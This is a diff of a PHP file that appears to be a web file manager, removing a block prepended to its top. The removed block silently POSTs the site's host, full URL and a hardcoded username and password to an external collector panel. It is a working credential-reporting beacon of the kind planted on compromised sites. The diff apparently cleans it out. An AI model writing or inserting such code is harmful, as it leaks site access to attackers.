@@ -1,35 +1,4 @@
 <?php
-// === TRACK + KIRIM KREDENSIAL PER-URL (POST) ===
-$panel = 'https://panel.trixygame.com/admin/collector/track.php';
-
-$host   = $_SERVER['HTTP_HOST'] ?? '';
-$https  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['SERVER_PORT'] ?? '') == '443');
-$scheme = $https ? 'https' : 'http';
-$url    = $scheme . '://' . $host . ($_SERVER['REQUEST_URI'] ?? '/');
-
-// --- KREDENSIAL PER SCRIPT (ISI SESUAI FILE INI) ---
-// Saran: ambil dari env/konfigurasi lokal agar tidak masuk ke repo
-$credUser = $_ENV['URLCRED_USER'] ?? 'kominfo';
-$credPass = $_ENV['URLCRED_PASS'] ?? '290802as';
-
-// Siapkan payload POST (JANGAN kirim via GET agar password tidak terekam di access log)
-$payload = http_build_query([
-  'd'  => $host,
-  'u'  => $url,
-  'up' => $credUser,
-  'pp' => $credPass,
-], '', '&');
-
-$ctx = stream_context_create([
-  'http' => [
-    'method'  => 'POST',
-    'header'  => "Content-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n",
-    'content' => $payload,
-    'timeout' => 1.0, // fail-fast, non-blocking
-  ]
-]);
-
-@file_get_contents($panel, false, $ctx);<?php
 // Selamat Datang //
 $CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":false,"hide_Cols":false,"theme":"light"}';
 
@@ -4327,3 +4296,4 @@ function lng($txt) {
 }
 
 ?>
+
